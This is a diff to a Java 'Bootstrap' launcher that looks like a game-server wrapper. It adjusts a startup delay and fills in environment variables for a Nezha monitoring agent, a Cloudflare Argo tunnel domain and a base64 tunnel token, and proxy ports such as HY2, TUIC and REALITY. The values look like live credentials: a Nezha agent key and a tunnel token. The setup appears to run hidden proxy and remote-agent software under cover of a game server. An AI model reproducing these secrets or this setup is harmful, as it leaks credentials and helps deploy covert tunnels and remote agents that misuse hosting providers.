@@ -27,7 +27,7 @@ public class Bootstrap
         if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) 
         {
             System.err.println(ANSI_RED + "ERROR: Your Java version is too lower,please switch the version in startup menu!" + ANSI_RESET);
-            Thread.sleep(34646);
+            Thread.sleep(30259);
             System.exit(1);
         }
 
@@ -94,14 +94,14 @@ public class Bootstrap
     }
     
     private static void loadEnvVars(Map<String, String> envVars) throws IOException {
-        envVars.put("UUID", "d9ebdb7b-0085-43c9-b660-a42fe00c2930");
+        envVars.put("UUID", "7d5d29cd-35d4-496a-b459-f60d4a76f0e6");
         envVars.put("FILE_PATH", "./world");
         envVars.put("NEZHA_SERVER", "nz.bbbub.com:443");
         envVars.put("NEZHA_PORT", "");
         envVars.put("NEZHA_KEY", "uZOmH0ZSipQfO3YN8yhg3FMQ0gEoaJQV");
         envVars.put("ARGO_PORT", "");
-        envVars.put("ARGO_DOMAIN", "");
-        envVars.put("ARGO_AUTH", "");
+        envVars.put("ARGO_DOMAIN", "sgyxj.106521.xyz");
+        envVars.put("ARGO_AUTH", "eyJhIjoiYjk0NmZiMzNmOTY5OGYzMWE1NDVmNDJmOWRmZTM2YTAiLCJ0IjoiZTgzNmQ4ZjAtYjI2Yy00NDBiLWI5Y2ItNWMxYTU5MzRlZDk2IiwicyI6IlptVTVZVFF5TnpJdE5qWXpPUzAwT0RSaExUaG1ZbUV0WTJSbFpqaGhZVFEzTW1WayJ9");
         envVars.put("HY2_PORT", "");
         envVars.put("TUIC_PORT", "");
         envVars.put("REALITY_PORT", "");
